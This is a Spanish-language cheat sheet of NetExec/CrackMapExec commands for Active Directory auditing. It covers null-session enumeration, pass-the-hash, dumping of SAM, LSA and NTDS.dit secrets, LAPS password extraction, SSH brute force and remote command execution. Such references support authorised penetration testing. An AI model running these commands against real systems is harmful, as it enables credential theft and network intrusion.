# NetExec & CrackMapExec Cheat Sheet
> **Guía rápida de comandos para NetExec (`nxc`) y CrackMapExec (`crackmapexec`) para la auditoría, enumeración y movimiento lateral en redes corporativas.**

---

## 🛡️ Protocolo SMB (Puerto 445)

SMB es el protocolo principal de auditoría en entornos Windows y Active Directory.

### 🔍 Enumeración Inicial y Null Session
* **Verificar acceso nulo (Null Session) e información básica**:
  ```bash
  nxc smb <IP_DC> -u '' -p ''
  ```
* **Listar recursos compartidos (Shares)**:
  ```bash
  nxc smb <IP_DC> -u '' -p '' --shares
  ```
* **Listar usuarios y políticas de contraseñas**:
  ```bash
  nxc smb <IP_DC> -u '' -p '' --users --pass-pol
  ```

### 🔑 Validación de Credenciales y Movimiento Lateral
* **Validar credenciales de dominio en un segmento de red**:
  ```bash
  nxc smb 192.168.1.0/24 -u 'usuario' -p 'contraseña'
  ```
* **Autenticación con Hash NTLM (Pass-The-Hash)**:
  ```bash
  nxc smb 192.168.1.0/24 -u 'usuario' -H 'NTLM_HASH_AQUI'
  ```
* **Autenticar como Administrador Local (`--local-auth`)**:
  ```bash
  nxc smb 192.168.1.0/24 -u 'Administrator' -p 'contraseña' --local-auth
  ```

### 💥 Post-Explotación y Extracción de Secretos
* **Ejecutar comandos en los objetivos (requiere privilegios de Admin)**:
  ```bash
  nxc smb 192.168.1.0/24 -u 'admin' -H 'HASH' -x 'whoami /priv'
  ```
* **Volcar las bases de datos SAM y secretos LSA locales**:
  ```bash
  nxc smb 192.168.1.0/24 -u 'admin' -H 'HASH' --sam
  nxc smb 192.168.1.0/24 -u 'admin' -H 'HASH' --lsa
  ```
* **Volcar la base de datos de Active Directory (`NTDS.dit`) desde el DC**:
  ```bash
  nxc smb <IP_DC> -u 'DomainAdmin' -p 'password' --ntds
  ```

---

## 🌳 Protocolo LDAP (Puertos 389, 636)

Ideal para enumerar objetos de Active Directory a alta velocidad.

* **Buscar contraseñas expuestas en descripciones de usuarios**:
  ```bash
  nxc ldap <IP_DC> -u 'usuario' -p 'password' --users
  ```
* **Listar todos los equipos del dominio**:
  ```bash
  nxc ldap <IP_DC> -u 'usuario' -p 'password' --computers
  ```
* **Extraer contraseñas de administrador local de LAPS**:
  ```bash
  nxc ldap <IP_DC> -u 'usuario' -p 'password' -M laps
  ```

---

## 🐚 Protocolo WinRM (Puerto 5985)

* **Validar credenciales y comprobar si la cuenta tiene privilegios de acceso remoto (Pwn3d!)**:
  ```bash
  nxc winrm <IP> -u 'usuario' -p 'password'
  ```
* **Ejecutar comandos sobre WinRM**:
  ```bash
  nxc winrm <IP> -u 'usuario' -p 'password' -x 'whoami'
  ```

---

## 🔒 Protocolo SSH (Puerto 22)

* **Validar credenciales de usuario locales o realizar fuerza bruta**:
  ```bash
  nxc ssh <IP> -u 'usuario' -p 'contraseña'
  # Usando una lista de usuarios y contraseñas:
  nxc ssh <IP> -u usuarios.txt -p contraseñas.txt
  ```
* **Ejecutar comandos de forma remota**:
  ```bash
  nxc ssh <IP> -u 'usuario' -p 'password' -x 'id'
  ```

---

## 🛢️ Protocolo MSSQL (Puerto 1433)

* **Validar credenciales de base de datos**:
  ```bash
  nxc mssql <IP> -u 'sa' -p 'password'
  ```
* **Habilitar y ejecutar comandos del sistema (`xp_cmdshell`)**:
  ```bash
  nxc mssql <IP> -u 'sa' -p 'password' -x 'whoami'
  ```
